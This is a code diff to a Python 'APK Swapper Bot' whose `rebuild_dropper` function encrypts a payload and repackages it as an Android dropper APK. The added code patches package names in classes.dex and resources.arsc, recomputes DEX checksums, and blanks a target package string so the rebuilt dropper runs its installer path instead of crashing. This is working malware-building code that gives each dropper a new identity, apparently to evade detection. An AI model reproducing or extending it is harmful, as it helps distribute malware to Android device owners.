@@ -2,7 +2,7 @@
 APK Swapper Bot — Full version with menu + auto-signing
 """
 
-import os, io, zipfile, secrets, logging, asyncio, hashlib, base64, datetime, struct
+import os, io, zipfile, secrets, logging, asyncio, hashlib, base64, datetime, struct, zlib
 from pathlib import Path
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
@@ -299,6 +299,66 @@ def _patch_pkg(data: bytes, new_pkg: str) -> bytes:
                 pos = end
     return bytes(result)
 
+_TARGET_PKG_NEEDLE = bytes([0x12, 0x12]) + b'com.btmo.awws.hoag'
+
+def _blank_target_pkg_arsc(data: bytes) -> bytes:
+    """Zero UTF-8 length prefix of target_package_name string in resources.arsc.
+
+    The global UTF-8 string pool stores R.string.target_package_name as
+    'com.btmo.awws.hoag'. When the 2-byte length prefix is zeroed, getString()
+    returns "" -> readTargetPackageFromStrings returns early without setting
+    actualTargetPackageName -> setupHomeUi takes the installer UI path instead
+    of crashing with NameNotFoundException on a device without that package.
+    """
+    result = bytearray(data)
+    idx = result.find(_TARGET_PKG_NEEDLE)
+    if idx == -1:
+        log.warning("target_package_name string not found in resources.arsc — crash may still occur")
+        return data
+    result[idx]     = 0  # UTF-16 char count
+    result[idx + 1] = 0  # UTF-8 byte count
+    log.info("Blanked target_package_name in arsc @offset %d", idx)
+    return bytes(result)
+
+
+def _patch_dex(dex: bytes, new_pkg: str) -> bytes:
+    """Patch UTF-8 authority strings in classes.dex and recompute header.
+
+    DEX string pool is MUTF-8. Old and new pkg are same byte length (hpfv→xxxx
+    both 4 chars, all ASCII), so ULEB128 length fields are unchanged.
+    Logic mirrors _patch_pkg:
+      standalone (no '.')             -> package authority string -> PATCH
+      followed by '.' + lowercase     -> provider / startup authority -> PATCH
+      followed by '.' + uppercase     -> class descriptor / constant -> SKIP
+    After patching: recompute SHA-1 (dex[32:]) and Adler32 (dex[12:]).
+    """
+    assert len(new_pkg) == len(OLD_PKG), "pkg length must match for in-place patch"
+    old_u8 = OLD_PKG.encode()   # UTF-8 / ASCII
+    new_u8 = new_pkg.encode()
+    result = bytearray(dex)
+    pos = 0
+    while True:
+        idx = result.find(old_u8, pos)
+        if idx == -1:
+            break
+        end  = idx + len(old_u8)
+        after = result[end] if end < len(result) else 0
+        if after != 0x2e:           # not '.'
+            result[idx:end] = new_u8
+            pos = idx + len(new_u8)
+        else:
+            sc = result[end + 1] if end + 1 < len(result) else 0
+            if 0x61 <= sc <= 0x7a:  # lowercase -> authority -> patch
+                result[idx:end] = new_u8
+                pos = idx + len(new_u8)
+            else:                   # uppercase/digit -> class descriptor -> skip
+                pos = end
+    # Recompute DEX SHA-1 (covers bytes[32:]) and Adler32 (covers bytes[12:])
+    result[12:32] = hashlib.sha1(bytes(result[32:])).digest()
+    struct.pack_into('<I', result, 8, zlib.adler32(bytes(result[12:])) & 0xFFFFFFFF)
+    return bytes(result)
+
+
 def rebuild_dropper(payload_bytes: bytes) -> tuple[bytes, str]:
     """Returns (apk_bytes, pkg_name)."""
     encrypted = encrypt_payload(payload_bytes)
@@ -316,6 +376,9 @@ def rebuild_dropper(payload_bytes: bytes) -> tuple[bytes, str]:
                 data = _patch_pkg(data, new_pkg)
             elif item.filename == "resources.arsc":
                 data = _patch_pkg(data, new_pkg)
+                data = _blank_target_pkg_arsc(data)
+            elif item.filename == "classes.dex":
+                data = _patch_dex(data, new_pkg)
             zout.writestr(item, data)
     log.info("Rebuilt dropper pkg=%s", new_pkg)
     return buf.getvalue(), new_pkg
